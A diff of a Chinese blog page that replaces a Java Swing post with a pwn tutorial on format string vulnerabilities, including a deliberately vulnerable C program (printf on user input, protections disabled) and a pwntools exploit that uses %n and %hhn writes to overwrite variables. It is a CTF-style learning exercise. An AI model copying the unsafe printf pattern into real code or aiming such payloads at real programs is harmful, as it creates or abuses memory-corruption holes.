@@ -6,20 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>基于JAVA图形化界面的云端 | ESE</title>
+  <title>PWN_x86—3_fmt | ESE</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！ JAVA云端">
+  <meta name="description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
 <meta property="og:type" content="article">
-<meta property="og:title" content="基于JAVA图形化界面的云端">
-<meta property="og:url" content="http://yoursite.com/2017/09/19/java_swing/index.html">
+<meta property="og:title" content="PWN_x86—3_fmt">
+<meta property="og:url" content="http://yoursite.com/2017/09/19/pwn3/index.html">
 <meta property="og:site_name" content="ESE">
-<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！ JAVA云端">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjozm52oh6j30fs08x75l.jpg">
-<meta property="og:updated_time" content="2017-09-19T09:21:56.919Z">
+<meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1emgyl8j309r02r3y9.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1fqmjamj30o807y77a.jpg">
+<meta property="og:updated_time" content="2017-10-05T06:20:48.258Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="基于JAVA图形化界面的云端">
-<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！ JAVA云端">
-<meta name="twitter:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjozm52oh6j30fs08x75l.jpg">
+<meta name="twitter:title" content="PWN_x86—3_fmt">
+<meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！每天学习一点PWN PWN从开始到开始–格式化字符串">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg">
   
   
     <link rel="icon" href="/favicon.png">
@@ -161,33 +163,36 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-java_swing" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-pwn3" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      基于JAVA图形化界面的云端
+      PWN_x86—3_fmt
     </h1>
   
 
         
-        <a href="/2017/09/19/java_swing/" class="archive-article-date">
-  	<time datetime="2017-09-19T09:07:14.292Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-19</time>
+        <a href="/2017/09/19/pwn3/" class="archive-article-date">
+  	<time datetime="2017-09-19T10:08:08.505Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-19</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>记录每天的进步，只有努力不会背叛自己！</p>
-<h1 id="JAVA云端"><a href="#JAVA云端" class="headerlink" title="JAVA云端"></a>JAVA云端</h1><a id="more"></a>
-<h2 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h2><p> swing图形化界面继承来自AWT图形化界面1、Swing 是一个为Java设计的GUI工具包。Swing是JAVA基础类的一部分。Swing包括了图形用户界面（GUI）器件如：文本框，按钮，分隔窗格和表。Swing提供许多比AWT更好的屏幕显示元素。它们用纯Java写成，所以同Java本身一样可以跨平台运行，这一点不像AWT。它们是JFC的一部分。它们支持可更换的面板和主题（各种操作系统默认的特有主题），然而不是真的使用原生平台提供的设备，而是仅仅在表面上模仿它们。这意味着你可以在任意平台上使用JAVA支持的任意面板。轻量级组件的缺点则是执行速度较慢，优点就是可以在所有平台上采用统一的行为 。</p>
-<h2 id="2、了解Java-swing-结构"><a href="#2、了解Java-swing-结构" class="headerlink" title="2、了解Java swing 结构"></a>2、了解Java swing 结构</h2><p><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjozm52oh6j30fs08x75l.jpg" alt=""></p>
-<p>Swing组件可以分成两种类型，一种是JComponent类，另一种是Window类。两者的区别是JComponent组件类主要包括一些不能独立显示的组件（即必须依赖于中间容器才能显示），而Window组件类主要包括了一些可以独立显示的组件。</p>
-<p>JFrame – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>JPanel – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。。<br>JLabel – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。<br>JTextField –一个轻量级组件，它允许编辑单行文本。<br>JPasswordField – 允许我们输入了一行字像输入框，但隐藏星号(*) 或点创建密码(密码)</p>
-<p>最后，直接上代码模型，这是我项目的部分，贴出来大家可以参考<br>百度链接: <a href="http://pan.baidu.com/s/1qY4tVuk" target="_blank" rel="external">http://pan.baidu.com/s/1qY4tVuk</a><br>密码： 6qp5</p>
+        <p>记录每天的进步，只有努力不会背叛自己！每天学习一点PWN</p>
+<h1 id="PWN从开始到开始–格式化字符串"><a href="#PWN从开始到开始–格式化字符串" class="headerlink" title="PWN从开始到开始–格式化字符串"></a>PWN从开始到开始–格式化字符串</h1><a id="more"></a>
+<h2 id="1、格式化字符串"><a href="#1、格式化字符串" class="headerlink" title="1、格式化字符串"></a>1、格式化字符串</h2><p>函数:<br>int printf(const char *format, [argument]);<br>printf()函数的调用格式为: printf(“&lt;格式化字符串&gt;”, &lt;参量表&gt;)。<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fjp192ut8dj306q06naak.jpg" alt=""></p>
+<p>基本的格式化字符串参数<br>%c：输出字符，配上%n可用于向指定地址写数据。<br>%d：输出十进制整数，配上%n可用于向指定地址写数据。<br>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。<br>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。<br>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。<br>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x10$n (%100d10$n)表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。<br>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
+<h2 id="2、源码"><a href="#2、源码" class="headerlink" title="2、源码"></a>2、源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line">int a = 123, b = 456;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	int c = 789;</div><div class="line">	char s[100];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</div><div class="line">	scanf(<span class="string">"%s"</span>, s);</div><div class="line">	<span class="built_in">printf</span>(s);   //格式化，利用参数传递，打印出我们需要的地址</div><div class="line"><span class="keyword">if</span> (c == 16) </div><div class="line">&#123;</div><div class="line">	puts(<span class="string">"modified c."</span>);</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (a == 2) </div><div class="line">	&#123;</div><div class="line">	puts(<span class="string">"modified a for a small number."</span>);</div><div class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == 0x12345678)</div><div class="line">		&#123;</div><div class="line">			puts(<span class="string">"modified b for a big number!"</span>);</div><div class="line">		&#125;</div><div class="line">	<span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>生成文件<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o fmt fmt.c</code></p>
+<h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>ida调试,因为a，b都是全局变量，找到a,b的地址<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1emgyl8j309r02r3y9.jpg" alt=""><br>gdb调试<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjp1fqmjamj30o807y77a.jpg" alt=""></p>
+<p>确定输入的是第6个参数</p>
+<h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">def ha():</div><div class="line">    p = process(<span class="string">'./fmt'</span>)</div><div class="line">    c_addr = int(p.recvuntil(<span class="string">'\n'</span>),16)</div><div class="line">    a_addr = 0x804A024</div><div class="line">    b_addr = 0x804A028</div><div class="line">    <span class="built_in">print</span> hex(c_addr)</div><div class="line">    raw_input()</div><div class="line">    payloadc = p32(c_addr)+<span class="string">'%12x'</span>+<span class="string">'%6$n'</span></div><div class="line">    payloada = <span class="string">'aa'</span>+<span class="string">'%8$n'</span>+<span class="string">'aa'</span>+p32(a_addr)</div><div class="line">    payloadb= p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)+<span class="string">'%104x'</span>+<span class="string">'%6$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%7$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%8$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%9$hhn'</span></div><div class="line">    p.sendline(payloadb)</div><div class="line">    <span class="built_in">print</span> p.recv()</div><div class="line">    p.interactive()</div><div class="line">ha()</div></pre></td></tr></table></figure>
+<p>这个exp解释一下：%12x表示填充12个字节。特别payloada的时候，%8$n是字符输入的，所以占4个字节，所以地址是在第8个参数，但是输出不会打印出来，所以下面的构造payloadb时候，%x$n不算在字节。</p>
 
       
 
@@ -272,7 +277,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/09/19/java_swing/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/09/19/pwn3/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -286,18 +291,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/09/19/pwn0_me/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/09/20/re_ctf_start/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          PWN0——me
+          RE
         
       </div>
     </a>
   
   
-    <a href="/2017/09/18/pwn0/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">基于绕过密码检测</div>
+    <a href="/2017/09/19/pwn2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PWN_x86—2_ret2blic</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -325,7 +330,7 @@
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="java_swing" data-title="基于JAVA图形化界面的云端" data-url="http://yoursite.com/2017/09/19/java_swing/"></div>
+	<div class="ds-thread" data-thread-key="pwn3" data-title="PWN_x86—3_fmt" data-url="http://yoursite.com/2017/09/19/pwn3/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
@@ -347,7 +352,7 @@
   
 
   
-  <div id="SOHUCS" sid="java_swing" ></div> 
+  <div id="SOHUCS" sid="pwn3" ></div> 
 <script type="text/javascript"> 
 window.YiliaChangyanWrap = function() {
     var appid = "true"; 
